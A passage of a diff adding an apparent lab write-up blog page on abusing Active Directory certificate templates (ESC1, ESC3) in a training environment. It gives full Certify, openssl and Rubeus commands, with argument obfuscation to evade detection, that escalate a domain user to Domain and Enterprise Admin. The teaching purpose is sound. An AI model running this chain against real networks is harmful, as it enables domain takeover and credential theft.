+        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+
+    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">HTTPSCertificates</span>
+    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="n">2</span>
+    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="n">10</span> <span class="n">years</span>
+    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="n">6</span> <span class="n">weeks</span>
+    <span class="n">msPKI-Certificates-Name-Flag</span>          <span class="p">:</span> <span class="n">ENROLLEE_SUPPLIES_SUBJECT</span>
+    <span class="n">mspki-enrollment-flag</span>                 <span class="p">:</span> <span class="n">INCLUDE_SYMMETRIC_ALGORITHMS</span><span class="p">,</span> <span class="n">PUBLISH_TO_DS</span>
+    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="n">0</span>
+    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+    <span class="n">mspki-certificate-application-policy</span>  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+    <span class="n">Permissions</span>
+      <span class="n">Enrollment</span> <span class="n">Permissions</span>
+        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">dcorp</span><span class="p">\</span><span class="n">RDPUsers</span>                <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">719815819</span><span class="p">-</span><span class="n">3726368948</span><span class="p">-</span><span class="n">3917688648</span><span class="p">-</span><span class="n">1123</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
+        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+</code></pre></div>
+
+<p>The  template grants enrollment rights to RDPUsers group and allows requestor to supply Subject Name. Recall that we are member of RDPUsers group. This means that we can request certificate for any user. From this we can request certificate of Administrator (Domain Admin)</p>
+<p>Requesting Certificate For Domain Admin (Administrator)
+<code>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator</code></p>
+<p>Okay, let's break down the flags used in the <code>certify.exe</code> command provided:</p>
+<ol>
+<li>request:</li>
+<li>
+<p>This flag tellscertify.exeto perform a certificate request operation.</p>
+</li>
+<li>
+<p>This flag tells certify.exe to perform a certificate request operation.</p>
+</li>
+<li>
+<p>/ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA:</p>
+</li>
+<li>This flag specifies the Certificate Authority (CA) to use for the certificate request.</li>
+<li>
+<p>The valuemcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CArepresents the full name of the enterprise CA.</p>
+</li>
+<li>
+<p>This flag specifies the Certificate Authority (CA) to use for the certificate request.</p>
+</li>
+<li>
+<p>The value mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA represents the full name of the enterprise CA.</p>
+</li>
+<li>
+<p>/template:"HTTPSCertificates":</p>
+</li>
+<li>This flag specifies the certificate template to use for the request.</li>
+<li>
+<p>In this case, the template is "HTTPSCertificates".</p>
+</li>
+<li>
+<p>This flag specifies the certificate template to use for the request.</p>
+</li>
+<li>
+<p>In this case, the template is "HTTPSCertificates".</p>
+</li>
+<li>
+<p>/altname:administrator:</p>
+</li>
+<li>This flag allows you to specify an alternative subject name for the certificate request.</li>
+<li>
+<p>In this case, the alternative name is "administrator".</p>
+</li>
+<li>
+<p>This flag allows you to specify an alternative subject name for the certificate request.</p>
+</li>
+<li>
+<p>In this case, the alternative name is "administrator".</p>
+</li>
+</ol>
+<p>This command can be used to request a certificate with the "administrator" subject name.</p>
+<p>Now let’s copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to ESC1.pem
+We need to convert it to PFX to use it. I will use MrStark123 as the export password</p>
+<p><code>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ESC1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\ESC1-Domain_Admin.pfx</code></p>
+<h3>Using PELoader.exe for args encoding.</h3>
+<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>ArgSplit.bat</p>
+<p><code>asktgt</code></p>
+<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
+<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">asktgt</span>
+<span class="nb">set </span><span class="s2">&quot;z=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=g&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;w=k&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;v=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;u=a&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Now let’s use PFX created  with Rubeus to request a TGT for Domain Admin - Administrator!</p>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /certificate:ESC1-Domain_Admin.pfx /password:MrStark123 /ptt</code></p>
+<p>As we can seen from the output above, the ticket has been successfully imported into our Cached Tickets, let’s enumerate it using <code>klist</code> command.</p>
+<p><code>klist</code></p>
+<p>Yes… we can confirm that our ticket as administrator has been imported to our Cached Tickets and we do have access as DollarCorp Domain Admin.</p>
+<p><code>winrs -r:dcorp-dc cmd</code></p>
+<p>Voila… We were able to escalate from a simple domain user to Domain Admin user.</p>
+<p>Now let’s use the same similar method to escalate from Domain Admin to Enterprise Admin.</p>
+<p><code>C:\AD\Tools&gt;C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator</code></p>
+<p>Bare in mind that this time for Enterprise Admin, we are requesting using moneycorp.local\administrator, this way we are not requesting for the Administrator of the current domain which is dollarcorp.moneycorp.local, but we are requesting it for moneycorp.local which is the Parent Domain of dollarcorp.</p>
+<p>Now let’s copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to ESC1.pem
+We need to convert it to PFX to use it. Use openssl binary on the student VM to do that. I will use MrStark123 as the export password</p>
+<p><code>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ESC1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\ESC1-Enterprise_Admin.pfx</code></p>
+<h3>Using PELoader.exe for args encoding.</h3>
+<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>ArgSplit.bat</p>
+<p><code>asktgt</code></p>
+<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
+<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">asktgt</span>
+<span class="nb">set </span><span class="s2">&quot;z=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=g&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;w=k&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;v=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;u=a&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Now let’s use PFX created  with Rubeus to request a TGT for Enterprise Admin - Administrator!</p>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:ESC1-Enterprise_Admin.pfx /password:MrStark123 /ptt</code></p>
+<p>Now, finally we were able to  escalate privilege from domain admin to Enterprise Admin.
+we can now access moneycorp.local domain controller.</p>
+<p><code>winrs -r:mcorp-dc cmd</code></p>
+<h1>Privilege Escalation to Domain Admin and Enterprise Admin using ESC3</h1>
+<p>using Certify.exe we can also use the flag <code>/vulnerable</code> to enumerate templates in moneycorp.local.</p>
+<p><code>certify.exe find /vulnerable</code></p>
+<p>The "<code>SmartCardEnrollment-Agent</code>" template has EKU(ExtendedKetUsage) for <code>Certificate Request Agent</code> and grants enrollment rights to Domain users. 
+If we can find another template that has an EKU(ExtendedKeyUsage) that allows for domain authentication and has application policy requirement of <code>certificate request agent</code>, we can request certificate on behalf of any user.</p>
+<p>With the command below we are able to find the perfect template we are looking for.
+<code>Certify.exe find</code></p>
+<div class="highlight"><pre><span></span><code> <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">SmartCardEnrollment-Users</span>
+    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="n">2</span>
+    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="n">10</span> <span class="n">years</span>
+    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="n">6</span> <span class="n">weeks</span>
+    <span class="n">msPKI-Certificates-Name-Flag</span>          <span class="p">:</span> <span class="n">SUBJECT_ALT_REQUIRE_UPN</span><span class="p">,</span> <span class="n">SUBJECT_REQUIRE_DIRECTORY_PATH</span>
+    <span class="n">mspki-enrollment-flag</span>                 <span class="p">:</span> <span class="n">AUTO_ENROLLMENT</span>
+    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="n">1</span>
+    <span class="n">Application</span> <span class="n">Policies</span>                  <span class="p">:</span> <span class="n">Certificate</span> <span class="n">Request</span> <span class="n">Agent</span>
+    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+    <span class="n">mspki-certificate-application-policy</span>  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+    <span class="n">Permissions</span>
+      <span class="n">Enrollment</span> <span class="n">Permissions</span>
+        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">dcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Users</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">719815819</span><span class="p">-</span><span class="n">3726368948</span><span class="p">-</span><span class="n">3917688648</span><span class="p">-</span><span class="n">513</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
+        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+</code></pre></div>
+
+<p>We were able to find the perfect template with the perfect sets we were looking for. As we can see above, we have what we were looking</p>
+<p>That great. Now let’s request an <code>Enrollment Agent Certificate</code> from the template "<code>SmartCardEnrollment-Agent</code>".</p>
+<p><code>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent</code></p>
+<p>Now let’s copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to ESC1.pem
+We need to convert it to PFX to use it. I will use MrStark123 as the export password</p>
+<p><code>C:\AD\Tools\openssl\openssl.exe pkcs12 -in ESC3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ESC3-Agent.pfx</code></p>
+<p>Now we can use the <code>Enrollment Agent Certificate</code> to request a certificate for DA from the template <code>SmartCardEnrollment-Users</code></p>
+<p><code>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\ESC3-Agent.pfx /enrollcertpw:MrStark123</code></p>
+<p>Once again, save the certificate text to ESC3_Domain-Admin.pem and convert the pem to pfx. Still using MrStark123 as the export password.</p>
+<p><code>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-Domain_Admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-Domain_Admin.pfx</code></p>
+<h3>Using PELoader.exe for args encoding.</h3>
+<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>ArgSplit.bat</p>
+<p><code>asktgt</code></p>
+<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
+<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">asktgt</span>
+<span class="nb">set </span><span class="s2">&quot;z=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=g&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;w=k&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;v=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;u=a&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Now let’s use the ESC3-Domain_Admin.pem created above with Rubeus to request a TGT for Domain Admin.</p>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /certificate:esc3-Domain_Admin.pfx /password:MrStark123 /ptt</code></p>
+<p>As we can seen from the output above, the ticket has been successfully imported into our Cached Tickets, let’s enumerate it using <code>klist</code> command.</p>
+<p><code>klist</code></p>
+<p>Yes the ticket has been imported, now we can access Domain Controller as Domain Admin.</p>
+<p><code>winrs -r:dcorp-dc cmd</code></p>
+<p>We were able to privilege escalate to Domain Admin.</p>
+<p>To escalate to Enterprise Admin, we just need to make changes to request to the SmartCardEnrollment-Users template and Rubeus. 
+Please note that we are using '<code>/onbehalfof: mcorp\administrator</code>' here.</p>
+<p><code>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\ESC3-Agent.pfx /enrollcertpw:MrStark123</code></p>
+<p>After we Convert the pem to ESC3-Enterprise_Admin.pfx using openssl with password MrStark123 and use the pfx with Rubeus</p>
+<p><code>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ESC3-Enterprise_Admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\ESC3-Enterprise_Admin.pfx</code></p>
+<h3>Using PELoader.exe for args encoding.</h3>
+<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>ArgSplit.bat</p>
+<p><code>asktgt</code></p>
+<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
+<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">asktgt</span>
+<span class="nb">set </span><span class="s2">&quot;z=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=g&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;w=k&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;v=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;u=a&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Now let’s use PFX created  with Rubeus to request a TGT for Enterprise Admin - Administrator!</p>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:moneycorp.local\administrator /certificate:C:\AD\Tools\ESC3-Enterprise_Admin.pfx /dc:mcorp-dc.moneycorp.local /password:MrStark123 /ptt</code></p>
+<p>Voila we were able to get Enterprise Admin privilege escalation. We can access domain controller using winrs.
+<code>winrs -r:mcorp-dc cmd</code></p>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
